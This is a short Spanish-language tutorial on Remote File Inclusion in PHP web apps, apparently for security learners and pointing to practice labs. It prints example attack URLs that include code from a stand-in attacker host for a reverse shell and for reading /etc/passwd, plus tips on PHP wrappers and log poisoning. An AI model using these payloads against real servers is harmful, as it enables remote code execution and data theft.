## Inclusión Remota de Archivos (RFI)
- La vulnerabilidad de Inclusión Remota de Archivos (RFI) es una fallo de seguridad en la que un atacante puede incluir archivos remotos en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

- En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

- Un atacante puede explotar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código dañino o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

## Ejemplo básico de ataque RFI:

```php
http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/script-malicioso.php
```

### Ejemplo con wrapper PHP:
```php
http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=http://sitio-del-atacante.com/script-malicioso.php
```

## Ejemplo avanzado de ataque RFI:

- Inclusión de un archivo remoto para obtener una shell inversa:
```php
http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/shell.php
```

- Uso de un archivo remoto para leer el contenido de un archivo sensible en el servidor:
```php
http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/leer-archivo.php?archivo=/etc/passwd
```

## Herramientas y recursos para practicar:

- **DVWP (Damn Vulnerable Web Project):** Un laboratorio para practicar vulnerabilidades como RFI.
  - Enlace al proyecto: [DVWP](https://github.com/vavkamil/dvwp)

- **Gwolle Guestbook:** Un plugin de WordPress que puede ser utilizado para pruebas de vulnerabilidades.
  - Enlace de descarga: [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)

## Consejos para explotarlo:

1. **Validar entradas:** Verifica si las entradas del usuario son validadas correctamente. Intenta incluir URLs externas y observa el comportamiento de la aplicación.

2. **Pruebas con wrapper de PHP:** Utiliza wrapper como `php://input`, `php://filter`, o `data://` para evadir restricciones.

3. **Logs del servidor:** En algunos casos, los logs del servidor pueden ser explotados para incluir código malicioso. Intenta apuntar a rutas como `/var/log/apache2/access.log`.
